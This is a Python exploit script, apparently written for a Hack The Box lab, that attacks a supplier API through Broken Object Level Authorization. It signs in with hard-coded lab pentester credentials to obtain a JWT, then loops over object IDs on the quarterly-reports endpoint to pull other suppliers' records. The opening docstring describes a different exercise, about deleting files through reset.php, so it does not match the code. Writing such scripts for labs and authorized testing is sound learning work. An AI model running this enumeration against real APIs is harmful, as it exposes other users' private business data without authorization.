""" 
---------------------------
Broken Object Level Authorization (BOLA)
---------------------------

1. Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.
"""

# Import Request to send web request to the internet
import requests
import sys
import requests
import subprocess
# Module to display output in different colors.
from colorama import Fore, Back, Style
"""
Disable the display of certificate warnings when requests 
are made to websites using insecure certificates. This can 
be useful in scenarios where targeted web applications use 
self-signed certificates as is the case in the AWAE labs.
"""
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

TOKEN = ""  # Global variable to store the JWT token

def main():
    """
    Main entry point:
    - validate CLI args
    - build request info
    - simulate (or actually perform) the request
    - format and print the response blocks
    """
    # If the script is ran without specify the target
    if len(sys.argv) != 2:
        print(f"In CLI, Usage should be: {sys.argv[0]} target")
        print(f"Example: {sys.argv[0]} 10.0.0.1")
        print(f"Example: {sys.argv[0]} manageengine")
        sys.exit(1)

    # Obtain taregt from CLI
    target = sys.argv[1].strip().rstrip('/')   # from CLI202

    # ====================== Broken Object Level Authorization (BOLA) ====================== #
    # Get JWT token for supplier (self) 
    headers = {
        'accept': 'application/json',
        'Content-Type': 'application/json',
    }

    json_data = {
        'Email': 'htbpentester2@pentestercompany.com',
        'Password': 'HTBPentester2',
    }


    # ============================ UPLOAD URL of TARGET ============================ #
    suppliers_sign_in_url = f"http://{target}/api/v1/authentication/suppliers/sign-in"
    get_suppliers_url = f"http://{target}/api/v1/suppliers/current-user"
    get_suppliers_quarterly_reports_url = f"http://{target}/api/v1/suppliers/quarterly-reports"
    get_supplier_yearly_report_url = f"http://{target}/api/v1/supplier-companies/yearly-reports"

    # ============================ 1. Initiate the sin in and get JWT token  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.post(suppliers_sign_in_url, headers=headers, json=json_data)
        token = r.json().get('jwt')
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)

    # Print the JWT token #
    print_token(token)

    # HEADERS for JWT token
    headers_jwt = {
        'accept': 'application/json',
        'Authorization': f'Bearer {token}',
    }

    # ============================ 2. Use JWT token to get suppliers current user information  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(get_suppliers_url, headers=headers_jwt)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)
    
    # Print the response #
    print_response(r)
    
    headers = {
        'accept': 'application/json',
        'Authorization': f'Bearer {token}',
    }   
    
    # EXPLOIT: Access other supplier's yearly reports

    for i in range(1, 20):
        response = requests.get(f'{get_suppliers_quarterly_reports_url}/{i}', headers=headers)
        print(f"\nGET SUPPLIERS QRTRLY REPORTS RESPONSE\n{response.text}\n")





def print_token(token):
    # ============================ FORMAT OUTPUT ============================ #
    print("\n======= JWT Token =======\n")
    print(format_text("JWT TOKEN:", token))

def print_response(r):
    # ============================ FORMAT OUTPUT ============================ #
    print("\n======= Johnny Custom Exploit Development =======\n")
    print(format_text("REQUEST METHOD:", r.request.method))
    print(format_text("REQUEST URL:", r.request.url))
    print(format_text("REQUEST HEADERS | r.headers is: :", r.request.headers))
    print(format_text("REQUEST BODY (raw):", r.request.body))   # shows form-encoded body
    print(format_text("RESPONSE STATUS | r.status_code is:", r.status_code))
    print(format_text("RESPONSE COOKIES | r.cookies is:", r.cookies))
    print(format_text("RESPONSE CONTENT-LENGTH:", len(r.text)))
    print(format_text("RESPONSE (first 300 chars):\n", r.text))

def format_text(title,item):
  """
    Helper to create a nicely formatted console output block.

    - title: short label for the section (e.g. "r.status_code is:")
    - item: item to display (will be stringified)
    Returns a string that contains the title, a separator, the item, and a short marker.
  """
  cr = '\r\n'
  section_break = cr +  "*" * 20 + cr
  item = str(item)
  text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break + '\t'
  return text

if __name__ == "__main__":
    main()